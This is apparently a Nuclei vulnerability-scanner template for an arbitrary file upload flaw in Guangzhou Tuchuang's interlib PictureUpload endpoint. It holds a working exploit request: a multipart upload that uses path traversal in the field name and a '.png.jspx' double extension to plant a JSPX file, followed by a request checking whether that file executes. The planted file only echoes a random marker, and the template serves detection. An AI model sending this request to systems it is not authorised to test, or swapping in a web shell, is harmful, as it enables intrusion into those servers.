id: guangzhou-tuchuang-pictureupload-file-upload
info:
  name: Guangzhou Tuchuang PictureUpload Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_base(5)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/interlib/loan/PictureUpload"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
    body: |
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="/../{{t1}}"; filename="{{t1}}.png.jspx"
      Content-Type: image/png

      <?xml version="1.0" encoding="UTF-8"?>
      <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
        <jsp:directive.page contentType="text/plain" pageEncoding="UTF-8"/>{{t2}}
      </jsp:root>
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "文件上传成功，图片压缩后文件大小为0K"
          - "<ISUPLOADED>true</ISUPLOADED>"
          - "jspx"

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/interlib/{{t1}}.png.jspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "trim(body) == t2"
